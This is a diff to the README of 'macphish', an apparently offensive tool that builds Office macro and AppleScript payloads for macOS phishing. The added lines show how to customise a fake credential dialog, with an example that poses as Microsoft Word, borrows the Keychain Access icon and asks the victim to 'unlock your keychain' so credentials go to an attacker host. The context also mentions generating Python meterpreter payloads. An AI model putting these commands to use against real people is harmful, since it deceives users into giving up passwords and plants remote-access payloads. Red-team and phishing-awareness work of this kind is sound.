@@ -17,6 +17,14 @@ To generate the macro:
 To generate the Applescript payload to be executed from a shell:
 
     $./macphish.py -a creds -lh <host> 
+    
+To customize the icon, title and message used in the dialog:
+
+    ./macphish.py -lh <host> -a creds -t <title> -msg <msg> -i <icon>
+
+For example, to use the keychain icon:
+
+    ./macphish.py -lh 0xdead -a creds -t "Microsoft Word" -msg "Unlock your keychain to decrypt this file" -i "file \"Applications:Utilities:Keychain Access.app:Contents:Resources:AppIcon.icns\""
 
 ## meterpreter (Office 2011/Office 2016 with limitations)
 This module generates python meterpreter payloads. In Office 2016, it will run inside the App Sandbox. 
